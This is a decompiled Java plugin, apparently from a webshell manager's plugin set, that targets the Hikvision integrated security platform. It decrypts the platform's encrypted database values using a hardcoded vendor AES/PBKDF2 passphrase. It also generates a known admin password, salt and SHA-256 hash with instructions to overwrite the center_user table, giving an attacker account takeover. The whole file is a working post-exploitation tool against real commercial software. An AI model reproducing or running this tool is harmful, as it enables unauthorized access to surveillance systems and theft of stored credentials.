package shells.plugins.conan;

//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//



import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;

public class ISECUREController {
    public ISECUREController() {
    }

    public static void main(String[] args) {
        System.out.println("=======================基 本 信 息=======================\n海康威视综合安防平台: 数据库解密/用户名密码替换\n下载地址: https://github.com/wafinfo/Hikvision\n只适合Windows平台使用，暂不支持linux+MacOs\n=======================使 用 文 档=======================\n");
        if (args.length != 1) {
            String password = getSHA256("P@ssw0rd0.c4ca4238a0b923820dcc509a6f75849b");
            System.out.println("[+] 生成密码成功：P@ssw0rd0.");
            System.out.println("[+] 生成salt成功：c4ca4238a0b923820dcc509a6f75849b");
            System.out.println("[+] 替换center_user表 password salt：" + password + " c4ca4238a0b923820dcc509a6f75849b");
            System.out.println("\n[+] 解密使用：java -jar Hikvision.jar EQAQAL5By8zVCjbJ9y5Dx5D50PudK8/DpYxLALFIHoOG0y286hgglnwspCcQka3Hj1x3jA==");
        }

    }

    public static String getSHA256(String str) {
        String encodeStr = "";

        try {
            MessageDigest messageDigest = MessageDigest.getInstance("SHA-256");
            messageDigest.update(str.getBytes(StandardCharsets.UTF_8));
            encodeStr = byte2Hex(messageDigest.digest());
        } catch (NoSuchAlgorithmException var3) {
            NoSuchAlgorithmException e = var3;
            e.printStackTrace();
        }

        return encodeStr;
    }

    private static String byte2Hex(byte[] bytes) {
        StringBuilder stringBuffer = new StringBuilder();
        byte[] var2 = bytes;
        int var3 = bytes.length;

        for(int var4 = 0; var4 < var3; ++var4) {
            byte b = var2[var4];
            String temp = Integer.toHexString(b & 255);
            if (temp.length() == 1) {
                stringBuffer.append("0");
            }

            stringBuffer.append(temp);
        }

        return stringBuffer.toString();
    }

    public static String DecryptData(String base) {
        try {
            byte[] decode = Base64.getDecoder().decode(base);
            if (decode[0] != 17) {
                return null;
            } else {
                int size = decode[1] << 8 | decode[2];
                byte[] salt = new byte[16];
                System.arraycopy(decode, 4, salt, 0, size);
                byte[] iv = new byte[16];
                System.arraycopy(decode, 20, iv, 0, iv.length);
                byte[] data = new byte[size];
                System.arraycopy(decode, 36, data, 0, data.length);
                Cipher instance = Cipher.getInstance("AES/CBC/PKCS5Padding");
                instance.init(2, new SecretKeySpec(SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256").generateSecret(new PBEKeySpec("Abc123@&$++Hik45".toCharArray(), salt, 10000, 256)).getEncoded(), "AES"), new IvParameterSpec(iv));
                return new String(instance.doFinal(data), StandardCharsets.UTF_8);
            }
        } catch (Exception var7) {
            Exception e = var7;
            e.printStackTrace();
            return null;
        }
    }

    public static String EncryptData(String base) {
        if (base.contains(":")) {
            String password = base.split(":")[0];
            String salt = base.split(":")[1];
            password = getSHA256(password + salt);
            return "[+] 生成密码成功：" + password + "\n[+] 生成salt成功：" + salt;
        } else {
            return "加密格式错误！！！\n例如:password:salt";
        }
    }
}

